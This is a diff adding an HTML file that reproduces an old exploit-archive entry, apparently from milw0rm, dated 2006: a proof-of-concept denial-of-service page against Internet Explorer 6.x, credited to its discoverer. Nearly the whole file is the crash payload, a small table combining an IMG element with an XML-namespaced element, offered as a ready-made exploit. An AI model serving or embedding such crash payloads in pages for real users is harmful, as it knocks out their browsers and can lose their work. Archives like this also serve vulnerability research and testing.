@@ -1,0 +1,20 @@
+<html>
+<head>
+<title>MS Internet Explorer <= 6.x (IMG / XML elements) Denial of Service</title>
+<pre>
+&lt;!--
+Discovered by
+Inge Henriksen (inge.henriksen@booleansoft.com) http://ingehenriksen.blogspot.com/
+--&gt;
+
+&lt;table&gt;
+  &lt;tr&gt;
+    &lt;td&gt;&lt;IMG align=left&gt;X X X&lt;?xml:namespace prefix=v&gt;
+      &lt;v:X style=&quot;HEIGHT:1&quot;&gt;&lt;/td&gt;
+  &lt;/tr&gt;
+&lt;/table&gt;
+
+# milw0rm.com [2006-01-18]
+</pre>
+</html>
+
